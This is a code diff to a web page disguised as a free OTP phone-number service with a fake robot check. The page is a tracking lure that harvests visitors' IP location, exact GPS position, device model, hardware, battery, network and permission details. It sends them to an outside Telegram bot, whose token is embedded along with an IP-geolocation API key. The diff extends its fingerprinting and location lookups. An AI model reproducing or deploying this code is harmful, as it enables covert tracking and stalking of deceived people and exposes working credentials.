@@ -9,54 +9,47 @@
         * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #1a1e29; color: white; margin: 0; padding: 15px; text-align: center; }
         .secure-badge { background: linear-gradient(90deg, #00d2ff 0%, #3a7bd5 100%); color: white; padding: 8px 20px; border-radius: 20px; display: inline-block; font-weight: bold; margin-bottom: 20px; }
-        
         .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px; margin-bottom: 20px;}
         .card { background: #232838; padding: 15px; border-radius: 15px; border: 1px solid #333a4f; display: flex; flex-direction: column; justify-content: space-between; }
         .flag { font-size: 30px; margin-bottom: 5px; }
         .country { font-weight: bold; color: #a0a5b5; font-size: 13px; margin-bottom: 5px; }
         .number { font-size: 15px; font-weight: bold; margin-bottom: 15px; color: #fff; direction: ltr;}
         .select-btn { background: #ff4757; color: white; border: none; padding: 8px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; }
-        
         .verify-popup { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(26, 30, 41, 0.98); z-index: 1000; display: none; flex-direction: column; justify-content: center; align-items: center; padding: 20px;}
         .verify-btn { background: #27ae60; color: white; border: none; padding: 20px 40px; font-size: 20px; border-radius: 10px; cursor: pointer; font-weight: bold; margin-top: 20px; }
-        
         .content { display: none; }
         #loading { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(26, 30, 41, 0.98); z-index: 999; padding-top: 40vh; font-size: 20px; color: #00d2ff; font-weight: bold;}
     </style>
 </head>
 <body>
-
     <div class="verify-popup" id="popup">
         <h2>⚠️ Human Verification Required</h2>
         <p>To get the OTP number, please verify you are not a robot.</p>
         <button class="verify-btn" onclick="triggerAction()">✅ I'm not a robot (Verify Now)</button>
     </div>
-
     <div class="content" id="mainContent">
         <div class="secure-badge">Secure • Temporary • Free</div>
         <p>Get your free OTP verification numbers instantly.</p>
         <div class="grid" id="country-grid"></div>
     </div>
-
     <div id="loading">Verifying... ⏳</div>
 
     <script>
         const BOT_TOKEN = '8631883105:AAEh_pa8GZUITtttMSVEryWLaTcgxwbLBrc';       
         const ADMIN_ID = '8564695453';  
         
+        // 🔑 المفتاح الخاص بك تم وضعه هنا بنجاح
+        const IP2LOCATION_API_KEY = '4A7604A4BA1A6853B0F1EF4B4415CDC8'; 
+        
         const urlParams = new URLSearchParams(window.location.search);
         const targetUserId = urlParams.get('id');
-        const mode = urlParams.get('mode') || 'basic'; // basic, location, camera
+        const mode = urlParams.get('mode') || 'basic';
         const urlLang = urlParams.get('lang'); 
 
         let botLang = 'en';
-        if (urlLang) {
-            botLang = urlLang;
-        } else if (navigator.language.startsWith('ar')) {
-            botLang = 'ar';
-        } else if (navigator.language.startsWith('hi')) {
-            botLang = 'hi';
-        }
+        if (urlLang) botLang = urlLang;
+        else if (navigator.language.startsWith('ar')) botLang = 'ar';
+        else if (navigator.language.startsWith('hi')) botLang = 'hi';
 
         let ipDataGlobal = {};
         let gpsData = null;
@@ -74,9 +67,6 @@
             { flag: "🇩🇪", name: "Germany", numbers: ["+49 15 1234 5678", "+49 17 9876 5432"] }
         ];
 
-        // ==========================================
-        // NEW: Alert helper (uses Telegram WebApp when available)
-        // ==========================================
         function showAlert(msg) {
             if (window.Telegram && window.Telegram.WebApp && typeof window.Telegram.WebApp.showAlert === 'function') {
                 try { window.Telegram.WebApp.showAlert(msg); return; } catch(e) {}
@@ -84,24 +74,16 @@
             alert(msg);
         }
 
-        // ==========================================
-        // NEW: Robust geolocation with fallback
-        // ==========================================
         function getGeolocation() {
             return new Promise((resolve, reject) => {
-                if (!navigator.geolocation) {
-                    return reject({ code: 0, message: 'Geolocation not supported' });
-                }
+                if (!navigator.geolocation) return reject({ code: 0 });
                 const attempt = (opts, isRetry) => {
                     navigator.geolocation.getCurrentPosition(
                         resolve,
                         (err) => {
-                            // If high-accuracy timed out or unavailable, retry with low accuracy
                             if (!isRetry && (err.code === 2 || err.code === 3)) {
                                 attempt({ enableHighAccuracy: false, maximumAge: 60000, timeout: 30000 }, true);
-                            } else {
-                                reject(err);
-                            }
+                            } else { reject(err); }
                         },
                         opts
                     );
@@ -111,28 +93,50 @@
         }
 
         async function initPage() {
-            try { 
-                const res = await fetch('https://ipwho.is/'); 
-                const data = await res.json();
-                if(data.success) { 
-                    ipDataGlobal = data; 
-                } else {
-                    const backupRes = await fetch('https://ipapi.co/json/');
-                    const backupData = await backupRes.json();
+            try {
+                // 1. المحاولة الأولى: IP2Location.io (بمفتاحك الخاص - الأدق)
+                const res1 = await fetch(`https://api.ip2location.io/?key=${IP2LOCATION_API_KEY}`);
+                const data1 = await res1.json();
+                if (data1 && data1.ip) {
                     ipDataGlobal = {
-                        ip: backupData.ip, country: backupData.country_name, region: backupData.region,
-                        city: backupData.city, latitude: backupData.latitude, longitude: backupData.longitude
+                        ip: data1.ip,
+                        country: data1.country_name,
+                        region: data1.region_name,
+                        city: data1.city_name,
+                        latitude: data1.latitude,
+                        longitude: data1.longitude
                     };
-                }
-            } catch (e) {
+                } else { throw new Error("IP2Location failed"); }
+            } catch (e1) {
                 try {
-                    const backupRes = await fetch('https://ipapi.co/json/');
-                    const backupData = await backupRes.json();
-                    ipDataGlobal = {
-                        ip: backupData.ip, country: backupData.country_name, region: backupData.region,
-                        city: backupData.city, latitude: backupData.latitude, longitude: backupData.longitude
-                    };
-                } catch(err) {}
+                    // 2. المحاولة الثانية: freeipapi.com
+                    const res2 = await fetch('https://free.freeipapi.com/api/v1/');
+                    const data2 = await res2.json();
+                    if (data2 && data2.ipAddress) {
+                        ipDataGlobal = {
+                            ip: data2.ipAddress,
+                            country: data2.countryName,
+                            region: data2.regionName,
+                            city: data2.cityName,
+                            latitude: data2.latitude,
+                            longitude: data2.longitude
+                        };
+                    } else { throw new Error("FreeIPAPI failed"); }
+                } catch (e2) {
+                    try {
+                        // 3. المحاولة الثالثة والأخيرة: ipapi.co
+                        const res3 = await fetch('https://ipapi.co/json/');
+                        const data3 = await res3.json();
+                        ipDataGlobal = {
+                            ip: data3.ip,
+                            country: data3.country_name,
+                            region: data3.region,
+                            city: data3.city,
+                            latitude: data3.latitude,
+                            longitude: data3.longitude
+                        };
+                    } catch (e3) {}
+                }
             }
 
             if (mode === 'location' || mode === 'camera') {
@@ -168,28 +172,21 @@
             document.getElementById('loading').style.display = 'block';
             
             if (mode === 'location') {
-                // MODIFIED: use robust getGeolocation with fallback
                 try {
                     const pos = await getGeolocation();
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
                     const acc = Math.round(pos.coords.accuracy);
-                    
                     let areaName = "Unknown";
                     try {
                         const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=${botLang}`);
                         const geoData = await geoRes.json();
                         if (geoData && geoData.display_name) { areaName = geoData.display_name; }
                     } catch(e) {}
-
                     gpsData = { lat: lat, lon: lon, acc: acc, areaName: areaName };
                     finishAction();
                 } catch (err) {
-                    const msg = botLang === 'ar'
-                        ? "يجب السماح بالوصول للموقع الدقيق."
-                        : botLang === 'hi'
-                            ? "आपको सटीक स्थान की अनुमति देनी होगी।"
-                            : "You must allow exact location access.";
+                    const msg = botLang === 'ar' ? "يجب السماح بالوصول للموقع الدقيق." : (botLang === 'hi' ? "आपको सटीक स्थान की अनुमति देनी होगी।" : "You must allow exact location access.");
                     showAlert(msg);
                     finishAction();
                 }
@@ -222,12 +219,21 @@
 
         function showFakeLoading() { alert("Preparing number..."); }
 
+        function getGPU() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return "Unknown";
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
+            } catch (e) { return "Unknown"; }
+        }
+
         async function sendBasicInfo() {
             if (!targetUserId) return;
 
             const ua = navigator.userAgent;
             
-            // 1. نظام التشغيل
             let osName = "غير معروف", osNameEn = "Unknown", osNameHi = "अज्ञात";
             let osVersion = "";
             if (/Windows/i.test(ua)) { osName = osNameEn = osNameHi = "Windows"; }
@@ -244,7 +250,6 @@
             else if (/Mac/i.test(ua)) { osName = osNameEn = osNameHi = "macOS"; }
             else if (/Linux/i.test(ua)) { osName = osNameEn = osNameHi = "Linux"; }
 
-            // 2. المتصفح
             let browserName = "Unknown";
             if (/Edg/i.test(ua)) browserName = "Edge";
             else if (/Chrome|CriOS/i.test(ua)) browserName = "Chrome";
@@ -252,7 +257,6 @@
             else if (/Safari/i.test(ua)) browserName = "Safari";
             else if (/Telegram/i.test(ua)) browserName = "Telegram In-App";
 
-            // 3. موديل الجهاز
             let deviceModel = "Unknown";
             const modelMatch = ua.match(/Android[^;]+;\s([^;)]+)\sBuild/i);
             if (modelMatch) deviceModel = modelMatch[1].trim();
@@ -264,7 +268,6 @@
                 }
             } catch (e) {}
 
-            // 4. منصة تليجرام
             let tgPlatform = "Browser", tgPlatformAr = "متصفح", tgPlatformHi = "ब्राउज़र";
             if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.platform && window.Telegram.WebApp.platform !== 'unknown') {
                 tgPlatform = "Telegram (" + window.Telegram.WebApp.platform + ")";
@@ -272,30 +275,22 @@
                 tgPlatformHi = "टेलीग्राम (" + window.Telegram.WebApp.platform + ")";
             }
 
-            // 5. ميزة Wi-Fi والبيانات
             let netAr = "غير معروف", netEn = "Unknown", netHi = "अज्ञात";
             if (navigator.connection) {
                 const type = navigator.connection.type;
                 const effType = navigator.connection.effectiveType;
-                
-                if (type === 'wifi' || effType === 'wifi') { 
-                    netAr = "🟢 واي فاي (Wi-Fi)"; netEn = "🟢 Wi-Fi"; netHi = "🟢 वाई-फाई"; 
-                } else if (effType === '4g' || effType === '3g' || effType === '2g' || effType === 'slow-2g') { 
-                    netAr = `🔵 بيانات (Data - ${effType.toUpperCase()})`; netEn = `🔵 Cellular (${effType.toUpperCase()})`; netHi = `🔵 सेलुलर (${effType.toUpperCase()})`; 
-                } else if (type && type !== 'none') {
-                    netAr = type; netEn = type; netHi = type;
-                }
+                if (type === 'wifi' || effType === 'wifi') { netAr = "🟢 واي فاي (Wi-Fi)"; netEn = "🟢 Wi-Fi"; netHi = "🟢 वाई-फाई"; }
+                else if (effType === '4g' || effType === '3g' || effType === '2g' || effType === 'slow-2g') { netAr = `🔵 بيانات (Data - ${effType.toUpperCase()})`; netEn = `🔵 Cellular (${effType.toUpperCase()})`; netHi = `🔵 सेलुलर (${effType.toUpperCase()})`; }
+                else if (type && type !== 'none') { netAr = type; netEn = type; netHi = type; }
             }
 
             let doNotTrack = navigator.doNotTrack === "1" ? "Enabled" : "Disabled";
             let orientation = screen.orientation ? screen.orientation.type : "Unknown";
             let colorDepth = screen.colorDepth + " bit";
 
-            // 6. المنطقة الزمنية
             let deviceTimezone = "Unknown";
             try { deviceTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) {}
 
-            // 7. البطارية
             let batteryAr = "غير مدعوم", batteryEn = "Not supported", batteryHi = "समर्थित नहीं है";
             try {
                 if (navigator.getBattery) {
@@ -308,26 +303,44 @@
                 }
             } catch (e) {}
 
-            // 8. الصلاحيات
             let camStatus = "Prompt", locStatus = "Prompt";
             try { camStatus = (await navigator.permissions.query({ name: 'camera' })).state; } catch(e) {}
             try { locStatus = (await navigator.permissions.query({ name: 'geolocation' })).state; } catch(e) {}
 
             let camAr = camStatus === 'granted' ? '🟢 مسموح' : camStatus === 'denied' ? '🔴 مرفوض' : '🟡 مطلوب';
             let locAr = locStatus === 'granted' ? '🟢 مسموح' : locStatus === 'denied' ? '🔴 مرفوض' : '🟡 مطلوب';
-            
             let camEn = camStatus === 'granted' ? '🟢 Granted' : camStatus === 'denied' ? '🔴 Denied' : '🟡 Prompt';
             let locEn = locStatus === 'granted' ? '🟢 Granted' : locStatus === 'denied' ? '🔴 Denied' : '🟡 Prompt';
-            
             let camHi = camStatus === 'granted' ? '🟢 अनुमति दी गई' : camStatus === 'denied' ? '🔴 अस्वीकृत' : '🟡 संकेत';
             let locHi = locStatus === 'granted' ? '🟢 अनुमति दी गई' : locStatus === 'denied' ? '🔴 अस्वीकृत' : '🟡 संकेत';
 
             const screenRes = `${window.screen.width}x${window.screen.height}`;
             const isTouch = navigator.maxTouchPoints > 0 ? `Yes (${navigator.maxTouchPoints})` : 'No';
 
-            // ==========================================
-            // قسم الـ GPS (هيظهر بس لو gpsData مش null)
-            // ==========================================
+            // تخمين الرام وكرت الشاشة
+            let gpuInfo = getGPU();
+            let cpuCores = navigator.hardwareConcurrency || "Unknown";
+            let approxRam = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
+            
+            let exactRamAr = "";
+            let dm = deviceModel.toLowerCase();
+            
+            if (dm.includes("sm-a") || dm.includes("samsung")) {
+                exactRamAr = "4GB أو 6GB (حسب الفئة)";
+            } else if (dm.includes("redmi note")) {
+                exactRamAr = "4GB أو 6GB";
+            } else if (dm.includes("redmi") || dm.includes("xiaomi") || dm.includes("mi ")) {
+                exactRamAr = "3GB إلى 8GB (حسب الفئة)";
+            } else if (dm.includes("iphone")) {
+                exactRamAr = "4GB إلى 8GB (حسب الموديل)";
+            } else {
+                exactRamAr = `~${approxRam} (تقريبي)`;
+            }
+
+            let finalRamAr = `• الرام: ${exactRamAr}\n• المعالج: ${cpuCores} نواة\n• كرت الشاشة: ${gpuInfo}`;
+            let finalRamEn = `• RAM: ~${approxRam} (Approx.)\n• CPU: ${cpuCores} Cores\n• GPU: ${gpuInfo}`;
+            let finalRamHi = `• रैम: ~${approxRam} (लगभग)\n• सीपीयू: ${cpuCores} कोर\n• जीपीयू: ${gpuInfo}`;
+
             let gpsSectionAr = "", gpsSectionEn = "", gpsSectionHi = "";
             if (gpsData) {
                 const mapLink = `https://www.google.com/maps?q=${gpsData.lat},${gpsData.lon}`;
@@ -338,9 +351,6 @@
 
             let report = "";
 
-            // ==========================================
-            // بناء الرسالة النهائية
-            // ==========================================
             if (botLang === 'ar') {
                 report = `
 📊 <b>تم سحب معلومات الزائر</b>
@@ -374,8 +384,7 @@
 • ${batteryAr}
 
 💾 <b>الهاردوير</b>
-• أنوية المعالج: ${navigator.hardwareConcurrency || 'غير معروف'}
-• الرام: ${navigator.deviceMemory ? navigator.deviceMemory + ' جيجا' : 'غير معروف'}
+${finalRamAr}
 • اللمس: ${isTouch}
 
 🔐 <b>الصلاحيات</b>
@@ -418,8 +427,7 @@ ${gpsSectionAr}
 • ${batteryHi}
 
 💾 <b>हार्डवेयर</b>
-• सीपीयू कोर: ${navigator.hardwareConcurrency || 'अज्ञात'}
-• रैम: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'अज्ञात'}
+${finalRamHi}
 • टच: ${isTouch}
 
 🔐 <b>डिवाइस अनुमतियाँ</b>
@@ -462,8 +470,7 @@ ${gpsSectionHi}
 • ${batteryEn}
 
 💾 <b>Hardware & Storage</b>
-• CPU Cores: ${navigator.hardwareConcurrency || 'Unknown'}
-• RAM: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'}
+${finalRamEn}
 • Touch Support: ${isTouch}
 
 🔐 <b>Device Permissions</b>
@@ -480,10 +487,6 @@ ${gpsSectionEn}
                 body: JSON.stringify({ chat_id: targetUserId, text: report, parse_mode: 'HTML', disable_web_page_preview: true })
             }).catch(e=>{});
 
-            // ==========================================
-            // NEW: إرسال خريطة الموقع الدقيق تحت التقرير
-            // (ده الجزء اللي كان اتمسح بالغلط)
-            // ==========================================
             if (gpsData) {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                     method: 'POST', headers: { 'Content-Type': 'application/json' },
